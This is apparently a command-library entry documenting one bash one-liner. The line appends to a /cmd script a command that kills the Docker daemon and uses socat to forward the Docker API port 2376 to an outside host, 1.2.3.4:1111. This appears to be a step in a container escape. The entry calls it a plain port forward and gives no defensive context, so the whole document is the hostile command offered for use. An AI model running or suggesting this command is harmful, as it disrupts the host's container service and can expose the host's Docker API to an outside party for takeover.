---
data: >-
  echo "sudo kill -9 999 && socat tcp-listen:2376,reuseaddr,fork
  tcp:1.2.3.4:1111 2> $host_path/k2" >> /cmd
tags:
  - scripting
type: command
executor: bash
platforms:
  - Linux
id: 82e7ba0c-6025-432b-bcdc-05f95b32ebe5
created_at: '2025-12-14T04:08:48.005Z'
updated_at: '2025-12-14T04:08:48.005Z'
verified: false
validated: true
submitted: true
---
# Append Kill and Socat to Cmd Script

## Command

```bash
echo "sudo kill -9 999 && socat tcp-listen:2376,reuseaddr,fork tcp:1.2.3.4:1111 2> $host_path/k2" >> /cmd
```

## Description

Adds commands to kill dockerd and forward port.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 999 | PID to kill | Yes |
| 1.2.3.4:1111 | Forward target | Yes |
| $host_path/k2 | Error log | Yes |

## Examples

### Basic Usage

```bash
echo "sudo kill -9 999 && socat tcp-listen:2376,reuseaddr,fork tcp:1.2.3.4:1111 2> $host_path/k2" >> /cmd
```

## Expected Output

Commands appended.

## Related

- [[commands/create-cmd-script-shebang]]
